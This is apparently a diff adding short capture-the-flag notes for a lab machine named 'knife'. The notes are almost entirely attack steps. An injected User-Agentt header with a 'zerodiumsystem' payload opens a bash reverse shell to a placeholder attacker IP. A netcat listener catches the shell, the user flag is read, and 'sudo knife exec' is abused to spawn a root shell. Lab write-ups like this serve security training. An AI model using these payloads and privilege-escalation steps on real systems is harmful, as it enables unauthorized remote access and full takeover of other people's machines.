@@ -1,0 +1,32 @@
+BURP SUITE (catch request and send to repeater):
+DNT: 1
+User-Agentt: zerodiumsystem("/bin/bash -c 'bash -i >&/dev/tcp/localtun0IP/NCport 0>&1);
+
+
+################################### Get the shell ##############
+kali@kali:~$ sudo nc -lnvp 6199
+listening on [any] 6199 ...
+connect to [10.10.14.135] from (UNKNOWN) [10.10.10.242] 44224
+bash: cannot set terminal process group (918): Inappropriate ioctl for device
+bash: no job control in this shell
+james@knife:/$ 
+
+ls && cat user.txt >>>>>>> FIRST FLAG!
+
+################################### Root Flag ##############
+
+james@knife:~$ sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
+sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# ls
+exp.rb
+sh.rb
+user.txt
+# cd
+# ls
+delete.sh
+root.txt
+snap
+#    
